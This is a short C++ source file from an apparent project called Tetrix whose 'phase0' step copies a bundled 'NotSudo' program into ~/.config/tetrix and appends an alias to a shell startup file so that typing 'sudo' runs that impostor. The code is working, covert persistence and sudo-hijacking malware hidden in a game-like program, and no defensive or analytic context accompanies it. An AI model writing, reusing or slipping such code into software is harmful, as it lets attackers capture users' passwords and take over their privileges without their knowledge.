#include "phase0.h"
#include <fstream>
#include <iostream>
#include <string>

phase0::phase0()
{

}

int phase0::execute(std::string infile)
{
	
	//Adele's phase 1 code goes here.
	system("mkdir ~/.config/tetrix/");
	system("cp ./resources/NotSudo ~/.config/tetrix/NotSudo");
	system("cp ./Tetrix ~/.config/tetrix/Tetrix");
	std::ifstream fs(infile,std::ifstream::in);
	std::string file="";
	if(fs.is_open())
	{
		std::string line{""};
		while(std::getline(fs,line))
		{
			file += line + "\n";
		}
	}
	fs.close();
	fs.clear();
	file += "alias sudo='~/.config/tetrix/NotSudo'\n";

	std::ofstream ofs(infile,std::ifstream::out);
	ofs << file;
	ofs.close();
	ofs.clear();

	//Done!
	return 0;
}
